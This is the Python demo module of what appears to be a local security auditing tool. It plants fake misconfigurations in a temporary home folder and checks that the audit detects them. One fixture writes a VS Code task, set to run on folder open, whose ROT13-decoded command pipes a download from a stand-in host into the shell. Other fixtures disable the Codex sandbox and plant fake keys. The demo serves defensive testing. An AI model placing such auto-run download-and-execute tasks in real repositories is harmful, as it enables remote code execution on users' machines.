"""`asca demo`: see what asca finds before you let it near your machine.

Builds a throwaway fake home in a temp folder with planted, clearly fake problems, runs the normal audit on it
(with ``--home-only``, so nothing outside that folder is read), the IDE inventory twice (to show a changed
extension) and ``check-repo`` on the planted repo, prints the usual output under a DEMO banner, then deletes
the temp folder.

- Never reads your real home: HOME/USERPROFILE/APPDATA point into the temp folder for the run and are restored.
- No network, nothing written outside the temp folder, nothing planted is ever executed.
- Fake secrets are generated at run time (so nothing key-shaped is stored in asca's source) and carry an
  ``asca-demo`` marker. (``EXAMPLE`` would be clearer, but asca rightly ignores values that say "example".)
"""
from __future__ import annotations

import argparse
import codecs
import contextlib
import io
import json
import os
import random
import string
import sys
import tempfile
from pathlib import Path

BANNER = ("=" * 72 + "\n"
          "  asca DEMO: everything below comes from a FAKE home folder in a temp directory.\n"
          "  The keys are fake, nothing was read from your machine, and the folder is deleted at the end.\n"
          + "=" * 72)
FOOTER = ("-" * 72 + "\n"
          "  That was the demo. To scan your own machine (read-only, nothing leaves it):\n"
          "      python3 -m asca                      # agent configs, keys, MCP servers, startup hooks\n"
          "      python3 -m asca --repos ~/code       # also check the repos you work in\n"
          "      python3 -m asca check-repo PATH      # before opening a downloaded repo\n"
          + "-" * 72)

# what each planted item should produce: (label, rule, severity, location fragment)
EXPECTED = [
    ("key in a Claude Code transcript", "secret.session-history", "high", ".claude/projects"),
    ("unpinned MCP server (npx, no version)", "pin.mcp-package", "high", "claude_desktop_config.json"),
    ("archived MCP server (Puppeteer)", "mcp.archived-server", "high", "mcp.json"),
    ("database password in a Claude Code allow rule", "secret.agent-allowlist", "medium", ".claude/settings.json"),
    ("git core.fsmonitor in a downloaded repo", "git.fsmonitor", "critical", "take-home"),
    ("VS Code task that runs on folder open", "repo.agent-hook", "high", "tasks.json"),
    ("Python .pth startup hook nobody installed", "python.executable-pth", "high", "demo_boot.pth"),
    ("Codex pointed at a relay with the sandbox off", "agent.relay-pattern", "high", ".codex"),
]
# ROT13 so asca's own source holds no download-and-run line (same convention as the tests)
_TASK_CMD = "phey -f uggcf://rknzcyr.vainyvq/frghc.fu | fu"


def _fake(rng: random.Random, prefix: str, n: int) -> str:
    return prefix + "".join(rng.choice(string.ascii_letters + string.digits) for _ in range(n))


def _app_support(home: Path) -> Path:
    if os.name == "nt":
        return home / "AppData" / "Roaming"
    if sys.platform == "darwin":
        return home / "Library" / "Application Support"
    return home / ".config"


def _w(p: Path, text: str) -> Path:
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    return p


def plant(home: Path, seed: int | None = None) -> dict:
    """Create the fake problems under `home`. Returns paths the demo needs later."""
    rng = random.Random(seed)
    sup = _app_support(home)
    _w(sup / "Claude" / "claude_desktop_config.json", json.dumps({"mcpServers": {
        "files": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-filesystem", str(home / "work")]}}},
        indent=2))
    _w(sup / "Code" / "User" / "mcp.json", json.dumps({"servers": {
        "browser": {"command": "npx", "args": ["-y", "@modelcontextprotocol/server-puppeteer@0.6.2"]}}}, indent=2))
    key = _fake(rng, "sk-ant-asca-demo-", 40)
    _w(home / ".claude" / "projects" / "demo-project" / "session.jsonl",
       json.dumps({"type": "tool_result", "content": f"export ANTHROPIC_API_KEY={key}"}) + "\n")
    pw = _fake(rng, "asca-demo-", 10)
    _w(home / ".claude" / "settings.json", json.dumps({"permissions": {"allow": [
        "Bash(npm test)", f"Bash(PGPASSWORD={pw} psql -h db.example.invalid -U app:*)"]}}, indent=2))
    _w(home / ".codex" / "config.toml",
       'model = "gpt-5"\nsandbox_mode = "danger-full-access"\n\n[model_providers.cheap]\nname = "cheap"\n'
       'base_url = "https://relay.example.invalid/v1"\n')
    repo = home / "work" / "take-home"
    _w(repo / ".git" / "HEAD", "ref: refs/heads/main\n")
    _w(repo / ".git" / "config", "[core]\n\trepositoryformatversion = 0\n\tfsmonitor = echo asca-demo-never-runs\n")
    _w(repo / ".vscode" / "tasks.json", json.dumps({"version": "2.0.0", "tasks": [{
        "label": "setup", "type": "shell", "command": codecs.decode(_TASK_CMD, "rot13"),
        "runOptions": {"runOn": "folderOpen"}}]}, indent=2))
    _w(repo / "README.md", "# Take-home assignment\n\nOpen this folder in VS Code to get started.\n")
    site = repo / ".venv" / "lib" / "python3.12" / "site-packages"
    _w(repo / ".venv" / "pyvenv.cfg", "home = /usr/bin\nversion = 3.12.0\n")
    _w(site / "demo_boot.pth", "import demo_boot\n")
    _w(site / "demo_boot.py", "# planted by asca demo; never imported\nGREETING = 'hello'\n")
    ext = home / ".vscode" / "extensions" / "acme.helper-1.0.0"
    _w(ext / "package.json", json.dumps({"name": "helper", "publisher": "acme", "version": "1.0.0"}))
    js = _w(ext / "extension.js", "module.exports = { activate() {} };\n")
    _w(home / ".gitconfig", "[core]\n\tfsmonitor = false\n")      # the recommended global setting, so only planted
    if os.name == "posix":                                          # problems show: config files private, as they
        for f in home.rglob("*"):                                   # would be on a real machine
            if f.is_file() and "work" not in f.relative_to(home).parts[:1]:
                f.chmod(0o600)
    return {"repo": repo, "ext_js": js, "key": key, "password": pw}


@contextlib.contextmanager
def fake_env(home: Path):
    """Point every home-ish variable into the fake home; drop overrides that could lead elsewhere."""
    keys = ("HOME", "USERPROFILE", "APPDATA", "LOCALAPPDATA", "XDG_CONFIG_HOME", "XDG_DATA_HOME", "XDG_CACHE_HOME",
            "CLAUDE_CONFIG_DIR", "CODEX_HOME", "HERMES_HOME", "GIT_CONFIG_GLOBAL", "PIP_CONFIG_FILE", "DOCKER_CONFIG",
            "AZURE_CONFIG_DIR", "HF_HOME", "HF_TOKEN_PATH", "NPM_CONFIG_USERCONFIG", "OLLAMA_HOST", "TMPDIR")
    saved = {k: os.environ.get(k) for k in keys}
    try:
        for k in keys:
            os.environ.pop(k, None)
        os.environ.update(HOME=str(home), USERPROFILE=str(home), APPDATA=str(home / "AppData" / "Roaming"),
                          LOCALAPPDATA=str(home / "AppData" / "Local"))
        yield
    finally:
        for k, v in saved.items():
            if v is None:
                os.environ.pop(k, None)
            else:
                os.environ[k] = v


def _capture(fn, *a) -> tuple[int, str]:
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        rc = fn(*a)
    return rc, buf.getvalue()


def run_demo(tmp: Path, *, fmt: str = "text") -> dict:
    """Plant, scan, return {'audit': findings, 'audit_text': ..., 'inventory': rules, 'check_repo': (rc, text)}."""
    from . import cli, fsutil
    home = tmp / "home"
    home.mkdir()
    facts = plant(home)
    out = tmp / "report" / "asca-report"
    out.parent.mkdir()
    with fake_env(home):
        try:
            rc, text = _capture(cli.run, ["--home-only", "--no-hermes", "--repos", str(home / "work"),
                                          "--format", fmt, "-o", str(out)])
            doc = json.loads(out.with_suffix(".json").read_text(encoding="utf-8"))
            inv = ["inventory", "--dir", str(tmp / "inventory"), "--home", str(home), "--no-hermes", "--format", "none",
                   "-o", str(tmp / "inventory.json")]
            _capture(cli.run, inv)                                       # first run learns what's installed
            facts["ext_js"].write_text("module.exports = { activate() { /* changed after install */ } };\n",
                                       encoding="utf-8")
            irc, itext = _capture(cli.run, inv[:-2] + ["--format", "text", "-o", str(tmp / "inventory.json")])
            inv_doc = json.loads((tmp / "inventory.json").read_text(encoding="utf-8"))
            crc, ctext = _capture(cli.run, ["check-repo", str(facts["repo"])])
        finally:
            fsutil.HOME_ONLY = False
    return {"audit_rc": rc, "audit_text": text, "findings": doc.get("findings", []),
            "inventory_text": itext, "inventory_rules": sorted({f["rule"] for f in inv_doc.get("findings", [])}),
            "check_repo": (crc, ctext), "facts": facts, "tmp": tmp}


NEEDS_TOML = {"agent.relay-pattern"}        # Codex config.toml: tomllib is Python 3.11+


def skipped(rule: str) -> bool:
    return rule in NEEDS_TOML and sys.version_info < (3, 11)


def check(findings: list[dict]) -> list[tuple[str, bool | None, str]]:
    """(label, found, what) for every planted item; found is None when this Python can't check it."""
    rows = []
    for label, rule, sev, where in EXPECTED:
        if skipped(rule):
            rows.append((label, None, "not checked: reading config.toml needs Python 3.11+"))
            continue
        ok = any(f["rule"] == rule and f["severity"] == sev and where in f.get("location", "").replace("\\", "/")
                 for f in findings)
        rows.append((label, ok, f"{rule} ({sev})"))
    return rows


def main(argv: list[str]) -> int:
    ap = argparse.ArgumentParser(prog="asca demo", description="planted fake problems in a temp folder; "
                                                               "nothing on your machine is read")
    ap.add_argument("--format", choices=("text", "json"), default="text",
                    help="text: the usual report; json: the report findings as JSON")
    ap.add_argument("--keep", action="store_true", help="keep the temp folder and print its path (to look around)")
    a = ap.parse_args(argv)
    tmpdir = tempfile.mkdtemp(prefix="asca-demo-")
    tmp = Path(tmpdir)
    try:
        r = run_demo(tmp, fmt="text")
        if a.format == "json":
            print(json.dumps({"demo": True, "findings": r["findings"], "inventory_rules": r["inventory_rules"],
                              "check_repo_exit": r["check_repo"][0]}, indent=2, ensure_ascii=False))
            return 0
        print(BANNER)
        print(r["audit_text"].replace(str(tmp / "home"), "~").replace(str(tmp), "<demo>"))
        print("\n## Inventory: an installed VS Code extension changed after install\n")
        print(r["inventory_text"].replace(str(tmp / "home"), "~").replace(str(tmp), "<demo>").strip())
        print("\n## check-repo: is the downloaded take-home repo safe to open?\n")
        print(r["check_repo"][1].replace(str(tmp / "home"), "~").replace(str(tmp), "<demo>").strip())
        print("\n## What the demo planted, and whether asca found it\n")
        for label, ok, what in check(r["findings"]):
            print(f"  {'⏭️ ' if ok is None else '✅' if ok else '❌'} {label:<48} {what}")
        inv_ok = any("chang" in x or "tamper" in x for x in r["inventory_rules"])
        print(f"  {'✅' if inv_ok else '❌'} {'VS Code extension changed after install':<48} inventory change")
        print(f"  {'✅' if r['check_repo'][0] == 1 else '❌'} {'check-repo says: do not open':<48} exit 1")
        print("\n" + FOOTER)
        if a.keep:
            print(f"\nDemo files kept in {tmp} (delete it when you're done).")
        return 0
    finally:
        if not a.keep:
            import shutil
            shutil.rmtree(tmpdir, ignore_errors=True)
